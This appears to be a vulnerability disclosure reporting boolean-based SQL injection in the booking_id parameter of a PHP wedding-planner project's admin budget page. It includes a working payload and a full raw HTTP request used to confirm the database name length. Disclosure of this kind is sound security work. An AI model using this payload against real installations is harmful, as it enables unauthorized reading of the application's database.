# Wedding Planner v1.0 by pushpam02 has SQL injection 

BUG_Author: Ptanly

vendor: https://www.sourcecodester.com/php/15375/wedding-planner-project-php-free-download.html

Vulnerability File: /Wedding-Management-PHP/admin/budget.php?booking_id=

Vulnerability url: http://ip/Wedding-Management-PHP/admin/budget.php?booking_id=

[+] Payload: /Wedding-Management-PHP/admin/budget.php?booking_id=31%20and%20length(database())%20=9&user_id=31 // Leak place ---> booking_id

dbname = dbwedding,length is 9

```sql
GET /Wedding-Management-PHP/admin/budget.php?booking_id=31%20and%20length(database())%20=9&user_id=31 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=ncd6h7doujvbbft46r0m7mbr6s
Connection: close
```

When length (database ()) = 8
![image](https://user-images.githubusercontent.com/54017627/183276494-66d3a91c-2d08-45d9-94e1-bf1640dae101.png)


When length (database ()) = 9
![image](https://user-images.githubusercontent.com/54017627/183276503-1941885a-ce57-46c3-beab-9dd12a031746.png)
